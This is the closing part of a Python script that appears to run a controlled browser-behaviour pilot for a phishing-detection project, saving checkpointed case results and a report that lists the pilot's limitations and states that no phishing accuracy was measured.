                if row["id"] in state["cases"]:
                    result=state["cases"][row["id"]]["result"]
                    print(f"  {n}/{len(fixture_rows)} {row['id']}: PASS (checkpoint)",flush=True)
                else:
                    result=run_case(browser,row,args.observe_ms,args.action_ms,PlaywrightError)
                    print(f"  {n}/{len(fixture_rows)} {row['id']}: {result['status'].upper()}",flush=True)
                    if result["status"]=="passed":
                        state["cases"][row["id"]]={"result":result,"result_digest":object_digest(result)}
                        save_json(state_path,state)
                results.append(result)
            feature_index=output/"controlled_behaviour_features.csv"
            write_feature_index(feature_index,results)
            passed=sum(r["status"]=="passed" for r in results)
            report={"status":"browser_behaviour_pilot_complete" if passed==len(results) else "browser_behaviour_pilot_checks_failed",
                "created_utc":datetime.now(timezone.utc).isoformat(),"config":config,
                "controlled_cases":len(results),"passed_cases":passed,"failed_cases":len(results)-passed,
                "cases_resumed_from_checkpoint":resumed,"credential_cue_checks":checks,
                "behaviour_feature_definitions":FEATURE_DEFINITIONS,"cases":results,
                "feature_index_sha256":sha_file(feature_index),"model_trained":False,
                "dataset_loaded":False,"dataset_or_model_inputs_changed":False,"official_test_evaluated":False,
                "live_websites_requested":False,"dummy_values_only":True,"phishing_accuracy_measured":False,
                "limitations":[
                    "Passing these known controlled cases validates instrumentation, not real-world phishing detection accuracy or resistance to arbitrary evasion.",
                    "Scenario roles/expected observations are software-test metadata, not training labels or classifier features.",
                    "Ordinary login and contact controls intentionally share behaviours with other scenarios. Credential entry, dynamic DOM changes and cross-origin requests do not by themselves establish phishing.",
                    "Cross-origin compares scheme/host/port; it is not the domain/site-group definition used by the static dataset splits.",
                    "The external-script case uses an embedded mock script. It does not recover missing external JS bodies from PhreshPhish archives.",
                    "The encoded-script case covers one known Base64/eval fixture, not arbitrary obfuscation or anti-analysis techniques.",
                    "Only bounded observation windows, chosen dummy interactions and capped traces/DOM snapshots are examined. Later or untriggered behaviour can remain unseen.",
                    "JavaScript API wrappers can affect page behaviour and can be bypassed. This prototype is not a hardened sandbox for arbitrary hostile pages.",
                    "No real personal information is used. Browser page requests are fulfilled from memory or aborted; responses and status codes are synthetic.",
                    "The original 106-feature model and feature extraction contract have not been changed. This report cannot be used as a new accuracy result."]}
            save_json(output/REPORT_NAME,report)
            print(f"Saved report: {(output/REPORT_NAME).resolve()}",flush=True)
            if passed==len(results):
                print(f"Browser behaviour pilot complete: {passed}/{len(results)} controlled cases passed. No phishing accuracy measured.",flush=True)
            else:
                print("Browser behaviour pilot has failed checks. Upload the report before changing any model.",flush=True)
                return 1
        finally:
            browser.close()
    return 0


if __name__=="__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        raise SystemExit("Pilot interrupted. Rerun the same command to reuse passed case checkpoints.")
    except (ValueError,KeyError,OSError,TypeError) as error:
        raise SystemExit(f"Browser behaviour pilot stopped: {error}. Keep the checkpoint and paste this output.")
